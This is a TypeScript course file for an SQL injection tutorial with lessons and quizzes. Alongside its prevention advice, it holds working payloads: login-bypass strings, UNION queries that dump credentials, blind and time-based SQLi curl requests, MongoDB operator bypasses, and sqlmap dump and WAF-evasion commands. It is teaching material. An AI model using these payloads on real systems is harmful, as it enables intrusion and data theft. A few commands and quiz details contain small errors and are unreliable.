import type { Lesson, Course } from '../types';

const l = (id: string, title: string, instruction: string, extras?: Partial<Lesson>): Lesson => ({
  id, title, instruction, image: null, ...extras,
});

export const LESSONS: Lesson[] = [
    l('sql-1', 'What is SQL?',
      `**SQL** (Structured Query Language) is how programs talk to databases. Websites use SQL to store users, products, posts, and everything else.

A database has **tables** (like spreadsheets), each with **columns** and **rows**.

\`\`\`sql
-- Example: a users table
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    email TEXT NOT NULL,
    password TEXT NOT NULL
);
\`\`\`

To get data:

\`\`\`sql
SELECT * FROM users;
\`\`\`

To get specific data:

\`\`\`sql
SELECT username, email FROM users WHERE id = 1;
\`\`\`

Web applications build SQL queries from user input. If they don't sanitize that input, you can inject your own SQL commands.

\`\`\`bash
# If you have SQLite installed, try:
sqlite3 test.db "CREATE TABLE users (id INT, name TEXT);"
sqlite3 test.db "INSERT INTO users VALUES (1, 'admin');"
            sqlite3 test.db "SELECT * FROM users;"
\`\`\`

> **Why this matters for hacking:** SQL injection has been in the OWASP Top 10 for over two decades. The root cause is simple: user input is concatenated directly into SQL queries. Understanding SQL basics is step one, every web application that touches a database is a potential target. In bug bounty programs, SQLi findings regularly pay $1,000-$10,000+.

**Mini-challenge:** Create an in-memory SQLite database and practice the SELECT/INSERT queries above. Run \`sqlite3 :memory: "CREATE TABLE users (id INT, name TEXT); INSERT INTO users VALUES (1, 'admin'); SELECT * FROM users;"\` to see how a database works from the command line.`,
      { hasQuiz: true, quiz: [
        { id: 'sql-1-q1', question: 'What does the following query return: SELECT username, email FROM users WHERE id = 1;', options: ['All rows of the users table', 'Only the username and email columns of the row with id 1', 'Only the id column', 'The whole database'], correctIndex: 1, explanation: 'This SELECT retrieves just the username and email columns, filtered to the row where id equals 1.' },
        { id: 'sql-1-q2', question: 'What is the root cause of SQL injection?', options: ['Using stored procedures', 'User input is concatenated directly into SQL queries without sanitization', 'Databases are too fast', 'The SELECT keyword is case sensitive'], correctIndex: 1, explanation: 'SQL injection happens when unsanitized user input is concatenated directly into SQL queries, letting attackers alter the query structure.' },
      ] }),

    l('sql-2', 'SELECT & WHERE',
      `The \`SELECT\` statement retrieves data. The \`WHERE\` clause filters it.

\`\`\`sql
-- Get all data
SELECT * FROM users;

-- Get specific columns
SELECT username, password FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE username = 'admin';

-- Match patterns with LIKE
SELECT * FROM users WHERE email LIKE '%@company.com';

-- Combine conditions
SELECT * FROM products
WHERE price > 100 AND category = 'electronics';
\`\`\`

A typical login query looks like:

\`\`\`sql
SELECT * FROM users
WHERE username = 'admin' AND password = 'secret123';
\`\`\`

If this returns any row, the login succeeds. If it returns no rows, login fails.

The problem: the application directly inserts user input into the query:

\`\`\`python
# Vulnerable code - NEVER do this
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
\`\`\`

> **Why this matters for hacking:** The authentication bypass pattern is the classic SQLi attack. By injecting \`OR '1'='1\` or \`' OR 1=1 --\`, you turn a login check that should return zero rows into one that returns all users. The query goes from \`WHERE username='hacker' AND password='x'\` to \`WHERE username='' OR 1=1 --' AND password='x'\`, and \`1=1\` is always true. This also works on API tokens, password reset forms, and any other authentication mechanism that queries a database.

**Mini-challenge:** Practice the injection visually: write out \`SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'x'\` and identify which parts are original SQL and which are injected. The \`--\` comments out the password check entirely.`,
      { hasQuiz: true, quiz: [
        { id: 'sql-2-q1', question: 'What does the WHERE clause do in a SELECT query?', options: ['Orders the results', 'Filters which rows are returned', 'Joins two tables', 'Limits the columns returned'], correctIndex: 1, explanation: 'The WHERE clause filters the rows returned by the query based on the given condition.' },
        { id: 'sql-2-q2', question: 'In the payload " OR 1=1 --, what does the -- do?', options: ['Adds a comment that makes the rest of the SQL query ignored', 'Encodes the payload', 'Converts the string to a number', 'Closes the connection'], correctIndex: 0, explanation: 'The double dash (--) is a SQL comment, so everything after it including the password check is ignored.' },
      ] }),

    l('sql-3', 'SQL Injection Discovery',
      `Finding SQL injection points is often as simple as typing a single quote (\`'\`).

When you enter \`'\` into a vulnerable form, the query becomes:

\`\`\`sql
SELECT * FROM users WHERE username = ''' AND password = 'x'
\`\`\`

The extra \`'\` breaks the string, causing a SQL syntax error. If the application shows an error, you've found a SQL injection.

**Test payloads:**

\`\`\`
'           -- Single quote (breaks the string)
''          -- Double quote (escaped quote, might work)
"           -- Double quote for databases that use them
')          -- Close the string and parenthesis
1' OR '1'='1   -- Always-true condition
1' --       -- Comment out the rest of the query
\`\`\`

**Error-based detection:**

If you see an error like:
\`\`\`
You have an error in your SQL syntax; check the manual...
\`\`\`

That's a SQL injection point. The database is telling you exactly where and how the query broke.

**Blind detection:**
If errors are hidden, use boolean-based tests:

\`\`\`sql
-- If both return the same response, SQLi is likely
www.site.com/page?id=1' AND '1'='1
www.site.com/page?id=1' AND '1'='2
\`\`\`

> **Why this matters for hacking:** Detection is the hardest part of SQLi exploitation. Error-based detection is loud but fast, database errors leak information about the backend (MySQL vs PostgreSQL vs SQL Server). Blind SQLi requires more skill but works when errors are suppressed. In real engagements, start with the single quote (\`'\`) test on every input, then progress to boolean-based timing tests if errors are hidden. Automated tools like sqlmap automate discovery, but manual testing finds edge cases that scanners miss.

Different responses (one works, one doesn't) confirm SQL injection exists.

**Mini-challenge:** Run \`echo "' OR '1'='1" | xxd\` to see how a single quote payload looks in hex. Then try \`curl -v "http://testphp.vulnweb.com/artists.php?artist=1'" 2>&1 | grep -i error\` on a vulnerable test site to see error-based detection in action.`,
      { hasQuiz: true, quiz: [
        { id: 'sql-3-q1', question: 'What is the simplest first test for finding a SQL injection point?', options: ['Entering a single quote (\') into a form field', 'Entering a very long password', 'Using uppercase SQL keywords', 'Refreshing the page'], correctIndex: 0, explanation: 'Typing a lone single quote breaks the SQL string; a syntax error in the response reveals the injection point.' },
        { id: 'sql-3-q2', question: 'When errors are hidden, how do you confirm blind SQL injection?', options: ['Use boolean-based tests comparing responses to true and false conditions', 'Try longer passwords', 'Disable JavaScript', 'Use a slower browser'], correctIndex: 0, explanation: 'Blind detection compares responses like id=1\' AND \'1\'=\'1 versus id=1\' AND \'1\'=\'2, where a differing response reveals the injection.' },
      ] }),

    l('sql-4', 'Bypassing Authentication',
      `The classic SQL injection attack: bypassing login.

A vulnerable login query:

\`\`\`sql
SELECT * FROM users
WHERE username = 'INPUT' AND password = 'INPUT2'
\`\`\`

Enter this as the username:

\`\`\`
admin' OR '1'='1
\`\`\`

The query becomes:

\`\`\`sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1' AND password = 'whatever'
\`\`\`

Since \`OR '1'='1'\` is always true, the query returns the first user (usually admin).

**Even simpler:**

\`\`\`
' OR 1=1 --
\`\`\`

\`\`\`sql
SELECT * FROM users
WHERE username = '' OR 1=1 --' AND password = 'x'
\`\`\`

The \`--\` comments out the rest of the query. \`1=1\` is always true. You're logged in as the first user.

**Comment syntax by database:**

\`\`\`sql
--  SQL comment (works in MySQL, PostgreSQL, SQLite)
#    MySQL specific comment
/* */ Block comment (works in most databases)
\`\`\`

> **Why this matters for hacking:** Once you bypass auth, the real target is data, user credentials, personal information, payment details. The \`UNION\` operator is the most powerful SQLi technique because it lets you read arbitrary tables. The \`information_schema\` (MySQL) or \`sqlite_master\` (SQLite) tables contain metadata about every table and column in the database. In CTF challenges, UNION-based SQLi is the standard way to extract the flag from the database.

Always test with different comment styles when one doesn't work.

**Mini-challenge:** Run \`sqlite3 :memory: "CREATE TABLE secrets (flag TEXT); INSERT INTO secrets VALUES ('FLAG{injection_success}'); SELECT 1, sqlite_version(), 3 UNION SELECT 1, flag, 3 FROM secrets;"\` to simulate a UNION-based extraction. This shows exactly how an attacker would enumerate version info and then dump data.`,
      { hasQuiz: true, quiz: [
        { id: 'sql-4-q1', question: 'Given the query WHERE username = \'admin\' OR \'1\'=\'1\' AND password = \'whatever\', why does login succeed?', options: ['Because admin is a valid user', 'Because OR \'1\'=\'1\' is always true, so the query returns the first user', 'Because the password is empty', 'Because the AND operator is disabled'], correctIndex: 1, explanation: 'The injected OR \'1\'=\'1\' is always true, so the WHERE clause matches rows regardless of the password, returning the first user.' },
        { id: 'sql-4-q2', question: 'Which comment syntax is MySQL-specific?', options: ['--', '#', '/* */', '//'], correctIndex: 1, explanation: 'The # character is a MySQL-specific comment, while -- works in MySQL, PostgreSQL, and SQLite.' },
      ] }),

    l('sql-5', 'Extracting Data with UNION',
      `Once you've found a SQL injection, the \`UNION\` operator lets you extract data from other tables.

\`\`\`sql
-- UNION combines results from two SELECT statements
SELECT name, email FROM users
UNION
SELECT title, body FROM posts;
\`\`\`

Both SELECTs must return the **same number of columns**.

**Step 1: Find the number of columns**

\`\`\`sql
' ORDER BY 1 --   (if error, keep going)
' ORDER BY 2 --   (no error? try 3)
' ORDER BY 3 --   (no error? try 4)
\`\`\`

When you get an error, the previous number was the column count.

Or use UNION with NULLs:

\`\`\`sql
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
\`\`\`

No error = that many columns.

**Step 2: Extract data**

\`\`\`sql
-- Get database version
' UNION SELECT 1, version(), 3 --

-- Get table names (MySQL)
' UNION SELECT 1, table_name, 3 FROM information_schema.tables --

-- Get column names from users table
' UNION SELECT 1, column_name, 3 FROM information_schema.columns
  WHERE table_name='users' --

-- Dump credentials
' UNION SELECT 1, username, password FROM users --
\`\`\`

**For SQLite:**

\`\`\`sql
-- Get SQLite version
' UNION SELECT 1, sqlite_version(), 3 --

-- Get all tables
' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' --

-- Get table schema
' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE name='users' --
\`\`\`

> **Why this matters for hacking:** UNION-based extraction is the main event of SQL injection. After finding the column count (via \`ORDER BY\` or \`UNION SELECT NULL\`), you can read any table in the database. The key is matching column types, use \`NULL\` as a placeholder to probe the column count without type mismatches, then replace each \`NULL\` with the data you want to extract. In MySQL, \`information_schema.tables\` and \`information_schema.columns\` are your maps to the entire database.

**Mini-challenge:** Simulate the column-count probe: \`sqlite3 :memory: "SELECT 1,2 UNION SELECT 1,2,3;"\` (note error — wrong column count). Then \`sqlite3 :memory: "SELECT 1,2 UNION SELECT 1,2;"\` (no error — 2 columns). This is the exact probing technique used against web applications.

Always extract the schema first so you know the table and column names.`,
      { hasQuiz: true, quiz: [
        { id: 'sql-5-q1', question: 'What requirement must both SELECT statements of a UNION satisfy?', options: ['The same number of columns', 'The same table name', 'The same number of rows', 'Identical column names'], correctIndex: 0, explanation: 'UNION combines results only when both SELECT statements return the same number of columns.' },
        { id: 'sql-5-q2', question: 'How do you find the number of columns in a UNION-based injection?', options: ['Try progressively as \' ORDER BY 1 --, ORDER BY 2, etc., until an error appears', 'Use the LIMIT keyword', 'Count the tables', 'Guess randomly'], correctIndex: 0, explanation: 'Incrementing the ORDER BY number until the query errors reveals the column count, since the last successful number was it.' },
      ] }),

    l('sql-6', 'Prevention & Mitigation',
      `The only real defense against SQL injection is **parameterized queries** (also called prepared statements).

**Vulnerable code (NEVER do this):**

\`\`\`python
# Python with raw string formatting. DANGEROUS
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
\`\`\`

**Safe code (parameterized query):**

\`\`\`python
# Python with parameterized query. SAFE
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
\`\`\`

The \`?\` is a placeholder. The database treats \`username\` as data, not as part of the SQL command. Even if someone enters \`' OR '1'='1\`, it's treated as a literal string to search for, not as SQL code.

**In other languages:**

\`\`\`java
// Java with PreparedStatement — SAFE
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
\`\`\`

\`\`\`php
// PHP with PDO — SAFE
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
\`\`\`

**Additional defenses:**
- **Input validation**: reject unexpected characters
- **Least privilege**: database accounts should have minimal permissions
- **WAF** - Web Application Firewall can block known attack patterns (but can be bypassed)
- **Regular security testing**: scan your applications for SQL injection

> **Why this matters for hacking:** Prevention is the other side of the coin. As a security professional, you need to understand both attack and defense. Parameterized queries (prepared statements) are the ONLY reliable defense because they separate SQL logic from data at the protocol level, before the database even sees the query. Input validation and WAFs can be bypassed. When doing code reviews, always check for string concatenation in SQL queries. Every instance is a critical vulnerability.

SQL injection is preventable. Every modern programming language supports parameterized queries. There is never a valid reason to concatenate user input into SQL queries.`, { hasQuiz: true, quiz: [
        { id: 'sql-6-q1', question: 'Why are parameterized queries safe against SQL injection?', options: ['They encrypt the query', 'User input is treated as data, not SQL code', 'They use a different database', 'They block all input'], correctIndex: 1, explanation: 'Parameterized queries send user input as data, separate from the SQL command structure.' },
        { id: 'sql-6-q2', question: 'What is the best defense against SQL injection?', options: ['Input validation', 'WAF', 'Parameterized queries', 'Encryption'], correctIndex: 2, explanation: 'Parameterized queries are the definitive defense as they fundamentally separate code from data.' },
      ] }),

    l('sql-7', 'Blind SQL Injection',
      `Sometimes the application doesn't show errors or return data. Blind SQLi uses true/false questions or time delays to extract data one bit at a time.

**Boolean-based blind SQLi:**
\`\`\`bash
# Test for boolean-based injection (page responds differently to true vs false)
curl "http://target.com/item?id=1' AND '1'='1"
curl "http://target.com/item?id=1' AND '1'='2"

# Extract data with boolean questions
curl "http://target.com/item?id=1' AND SUBSTRING(database(),1,1)='m' -- "
\`\`\`

**Time-based blind SQLi:**
\`\`\`bash
# MySQL
curl "http://target.com/item?id=1' AND SLEEP(5) -- "

# PostgreSQL
curl "http://target.com/item?id=1' AND (SELECT pg_sleep(5)) -- "

# MS SQL Server
curl "http://target.com/item?id=1'; WAITFOR DELAY '0:0:5' -- "
\`\`\`

**Extract data using time:**
\`\`\`bash
# Check first character of database name
            curl "http://target.com/item?id=1' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(3), 0) -- "
\`\`\`

> **Why this matters for hacking:** Blind SQLi is the most common real-world scenario because modern applications rarely expose database errors. Boolean-based blind requires many requests (one bit of data per request), so automating it is essential. Time-based blind is slower but works even when the application returns identical HTTP responses regardless of true/false. The \`SLEEP(5)\` function pauses the database for 5 seconds, if the response takes 5+ seconds, you know the condition was true. Database-specific sleep functions: MySQL uses \`SLEEP(n)\`, PostgreSQL uses \`pg_sleep(n)\`, SQL Server uses \`WAITFOR DELAY '0:0:n'\`.

**Mini-challenge:** Run \`curl -v -o /dev/null -s -w "%{time_total}\\n" "https://httpbin.org/delay/3"\` to measure a 3-second delayed response. Then modify to \`delay/1\` and compare timing. Understanding response time measurement is essential for time-based blind injection testing.`,
      { hasQuiz: true, quiz: [
        { id: 'sql-7-q1', question: 'What distinguishes blind SQL injection from classic SQL injection?', options: ['The application does not show query results or database errors directly', 'It only works on MySQL', 'It requires root privileges', 'It is faster'], correctIndex: 0, explanation: 'Blind SQLi must infer answers through true/false responses or time delays because errors and data are hidden.' },
        { id: 'sql-7-q2', question: 'Which function pauses a PostgreSQL database for 5 seconds?', options: ['SLEEP(5)', 'pg_sleep(5)', 'WAITFOR DELAY \'0:0:5\'', 'DELAY(5)'], correctIndex: 1, explanation: 'PostgreSQL uses pg_sleep(n), while MySQL uses SLEEP(n) and SQL Server uses WAITFOR DELAY.' },
      ] }),

    l('sql-8', 'NoSQL Injection',
      `Modern apps use MongoDB and other NoSQL databases. They have their own injection patterns.

**MongoDB injection:**
\`\`\`bash
# Test with JSON operators
curl -d 'username[$ne]=&password[$ne]=' https://target.com/login

# JSON content type
curl -X POST -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}' \
  https://target.com/login
\`\`\`

**MongoDB operators:**
- \`$ne\`, not equal (match everything)
- \`$gt\`, greater than
- \`$regex\`, pattern matching
- \`$where\` - JavaScript expression (code injection!)

> **Why this matters for hacking:** NoSQL databases are not immune to injection, the attack vector just changes. MongoDB's \`$ne\` (not equal) operator matches every document, so \`{"username": {"$ne": ""}}\` matches any user. The \`$regex\` operator allows pattern matching, and \`$where\` allows arbitrary JavaScript execution, the most dangerous. In modern web apps (especially Node.js/MERN stack), NoSQL injection is often overlooked because developers assume NoSQL databases are "safe" from SQL injection. They're not.

**Mini-challenge:** Install \`mongosh\` or use MongoDB's free cloud sandbox. Run \`db.users.find({username: {$ne: ""}})\` to see how the \`$ne\` operator matches all documents. Then compare with a direct string match: \`db.users.find({username: "admin"})\`. This demonstrates how JSON operators change query behavior.

Prevention: validate input types strictly. Never pass user input directly into MongoDB queries.`,
      { hasQuiz: true, quiz: [
        { id: 'sql-8-q1', question: 'Why does the payload {"username": {"$ne": ""}} match all users in MongoDB?', options: ['Because $ne (not equal) matches every document whose username is not empty', 'Because it deletes the collection', 'Because $ne stands for new entry', 'Because it sorts by username'], correctIndex: 0, explanation: 'The $ne (not equal) operator matches any document where the field does not equal the given value, so \'$ne\': "" matches all users.' },
        { id: 'sql-8-q2', question: 'Which MongoDB operator allows arbitrary JavaScript execution?', options: ['$ne', '$gt', '$where', '$regex'], correctIndex: 2, explanation: 'The $where operator evaluates JavaScript expressions, making it the most dangerous query operator if user input is injected.' },
      ] }),

    l('sql-9', 'Second-Order SQL Injection',
      `Second-order SQLi stores the payload, then triggers it later.

**How it works:**
\`\`\`bash
# Step 1: Register with malicious username "admin' --"
# Step 2: Data stored in database
# Step 3: Later, profile page uses username in a query:
# SELECT * FROM users WHERE username = 'admin' -- '
# Now viewing admin's data!
\`\`\`

> **Why this matters for hacking:** Second-order injection is one of the most subtle and dangerous SQLi variants because it evades both automated scanners and manual testing. The payload passes through an input sanitizer (e.g., at registration) that would catch it inline, but is stored in the database. Later, when a different code path retrieves the data and uses it in another query, the payload activates. This is why code reviews should trace data flow all the way from input to output to every query usage.

**Mini-challenge:** Simulate second-order by writing \`echo "admin' --" | sqlite3 test.db "CREATE TABLE users (name TEXT); INSERT INTO users VALUES ('"'"'admin'"'"' --');"\`" -- note the escaped quote. This teaches how stored data can contain injection payloads that activate when reused in a different query context.

**Why it's hard to find:**
- Payload goes through two different code paths
- Automated scanners rarely maintain state across requests
- Registration code may escape differently than profile code

**Prevention:** Parameterize ALL queries — even those using data from the database.`,
      { hasQuiz: true, quiz: [
        { id: 'sql-9-q1', question: 'How does a second-order SQL injection work?', options: ['The payload is stored in the database first, then triggered later when the data is reused in another query', 'It sends two payloads at once', 'It only works with XML', 'It exploits the second login attempt'], correctIndex: 0, explanation: 'Second-order SQLi stores a payload (e.g. a malicious username at registration) and triggers it later when a different code path reuses that data in a query.' },
        { id: 'sql-9-q2', question: 'Why do automated scanners often miss second-order SQL injection?', options: ['They are too slow', 'They rarely maintain state across requests, so the stored payload is never triggered', 'They only test GET requests', 'They use encryption'], correctIndex: 1, explanation: 'Automated scanners usually fail to maintain state across requests, so they never complete the store-then-trigger chain that second-order attacks require.' },
      ] }),

    l('sql-10', 'SQL Injection Automation with sqlmap',
      `Sqlmap automates SQL injection detection and exploitation.

\`\`\`bash
# Basic detection
sqlmap -u "http://target.com/item?id=1"

# Load request from Burp
sqlmap -r request.txt

# List databases
sqlmap -u "http://target.com/item?id=1" --dbs

# Dump a table
sqlmap -u "http://target.com/item?id=1" -D dbname -T users --dump

# Bypass WAF with tamper scripts
sqlmap -u "http://target.com/item?id=1" --tamper=space2comment

# Check if DBA
sqlmap -u "http://target.com/item?id=1" --is-dba
\`\`\`

> **Why this matters for hacking:** Sqlmap is the most powerful SQLi automation tool in existence. It handles detection, blind injection, out-of-band exfiltration, and even database takeover. However, it's noisy, the \`--tamper\` flag helps evade WAFs (e.g., \`--tamper=space2comment\` replaces spaces with comments, \`--tamper=between\` replaces \`>\` with \`NOT BETWEEN\`). Always start with \`--batch\` for non-interactive mode and \`--risk=1\` for safe probes. NEVER run sqlmap against targets without authorization.

**Mini-challenge:** Run \`sqlmap --version\` to confirm installation. Then try \`sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch\` (with permission) to see automated detection in action. Observe how sqlmap tests each parameter, identifies the DBMS, and suggests exploitation techniques.

Master sqlmap to automate the tedious parts of SQL injection testing, but always understand what it's doing under the hood.`, { hasQuiz: true, quiz: [
        { id: 'sql-10-q1', question: 'Which sqlmap flag dumps all tables from all databases?', options: ['--dump', '--dump-all', '--all', '--extract'], correctIndex: 1, explanation: '--dump-all dumps all tables from all databases. Use with caution, it generates a lot of data.' },
        { id: 'sql-10-q2', question: 'What does --tamper=space2comment do?', options: ['Speeds up the scan', 'Replaces spaces with comments to bypass WAF', 'Adds delays', 'Encrypts payloads'], correctIndex: 1, explanation: 'space2comment replaces space characters with /**/ comments, which can bypass simple WAF rules that look for spaces in SQL keywords.' },
      ] }),
];

export const COURSE: Course = {
  id: 'sql-injection-101',
  title: 'SQL Injection 101',
  categoryId: 'web-security',
  description:
    'The most infamous web vulnerability. Learn to find, exploit, and prevent SQL injection attacks.',
  overview:
    'SQL injection has been the #1 web vulnerability for two decades. This course teaches you how databases work, how SQL queries are constructed, and how attackers inject malicious SQL to extract data, bypass auth, and compromise systems.',
  estimatedMinutes: 85,
  cpCost: 100,
  learningObjectives: [
      'Understand how SQL databases store and retrieve data',
      'Identify SQL injection points in web applications',
      'Exploit SQLi to bypass authentication and extract data',
      'Apply parameterized queries and prepared statements as defenses',
  ],
  skillLevel: 'intermediate',
  prerequisites: ["web-technologies-101"],
  popular: true,
  lessons: LESSONS,
};
